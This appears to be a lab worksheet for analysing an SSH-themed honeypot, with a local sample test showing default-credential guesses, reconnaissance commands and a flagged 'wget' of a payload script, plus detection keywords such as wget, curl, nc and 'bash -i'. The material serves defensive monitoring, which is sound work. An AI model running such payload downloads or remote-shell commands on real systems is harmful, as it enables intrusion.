# Honeypot Analysis

Record observations from `logs/honeypot.log` and `logs/connections.jsonl` after running `docker-compose up honeypot`.

## Environment
- Protocol: SSH-themed faux service on port 22 (host: 2222)
- Banner: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`
- Prompt: Ubuntu 20.04 shell with canned responses

## Sample Test (local)
- Source: 127.0.0.1:59922
- Auth attempts: `root/password`, `admin/admin123`, `pi/raspberry` (all failed → alert for multiple failures)
- Commands: `whoami`, `pwd`, `ls -la`, `wget http://example.com/payload.sh` (flagged suspicious keyword `wget`)
- Duration: ~65s; 4 commands recorded

## Summary of Observed Attacks
- [ ] Source IPs/ports and volumes by hour
- [ ] Username/password pairs and frequency
- [ ] Commands executed and suspicious indicators
- [ ] Session durations and repeat visitors

## Notable Patterns
- [ ] Repeated credential guesses per IP (alerts fired ≥3 failures)
- [ ] Automation fingerprints (e.g., sequential `whoami` → `uname -a` → `wget`)
- [ ] High-risk commands containing wget/curl/nc/bash -i

## Recommendations
- [ ] Rate-limit or tarp it on repeated failures
- [ ] Add fuller filesystem simulation (`/etc/ssh/`, `/var/log/`, `ps` with more rows)
- [ ] Forward `alert` events to SIEM; enrich with GeoIP
- [ ] Correlate with other lab services (webapp, redis) for multi-vector campaigns
